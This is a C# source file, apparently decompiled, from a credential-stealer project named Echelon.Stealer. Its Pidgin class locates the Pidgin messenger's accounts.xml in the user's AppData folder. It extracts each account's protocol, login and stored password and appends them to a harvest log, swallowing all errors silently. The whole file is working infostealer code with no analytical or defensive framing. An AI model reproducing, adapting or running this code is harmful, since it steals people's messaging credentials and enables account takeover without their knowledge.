using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Echelon.Stealer.Jabber
{
	// Token: 0x0200001A RID: 26
	internal class Pidgin
	{
		// Token: 0x06000069 RID: 105 RVA: 0x000089B1 File Offset: 0x00006BB1
		public static void Start(string directorypath)
		{
			if (File.Exists(Pidgin.PidginPath))
			{
				Directory.CreateDirectory(directorypath + "\\Jabber\\Pidgin\\");
				Pidgin.GetDataPidgin(Pidgin.PidginPath, directorypath + "\\Jabber\\Pidgin\\Pidgin.log");
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x0001A6C4 File Offset: 0x000188C4
		public static void GetDataPidgin(string PathPn, string SaveFile)
		{
			try
			{
				if (File.Exists(PathPn))
				{
					try
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(new XmlTextReader(PathPn));
						foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
						{
							XmlNode xmlNode = (XmlNode)obj;
							string innerText = xmlNode.ChildNodes[0].InnerText;
							string innerText2 = xmlNode.ChildNodes[1].InnerText;
							string innerText3 = xmlNode.ChildNodes[2].InnerText;
							if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3))
							{
								break;
							}
							Pidgin.SBTwo.AppendLine("Protocol: " + innerText);
							Pidgin.SBTwo.AppendLine("Login: " + innerText2);
							Pidgin.SBTwo.AppendLine("Password: " + innerText3 + "\r\n");
							Pidgin.PidginAkks++;
							Pidgin.PidginCount++;
						}
						if (Pidgin.SBTwo.Length > 0)
						{
							try
							{
								File.AppendAllText(SaveFile, Pidgin.SBTwo.ToString());
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000055 RID: 85
		public static int PidginCount;

		// Token: 0x04000056 RID: 86
		public static int PidginAkks;

		// Token: 0x04000057 RID: 87
		private static readonly string PidginPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple\\accounts.xml");

		// Token: 0x04000058 RID: 88
		private static StringBuilder SBTwo = new StringBuilder();
	}
}
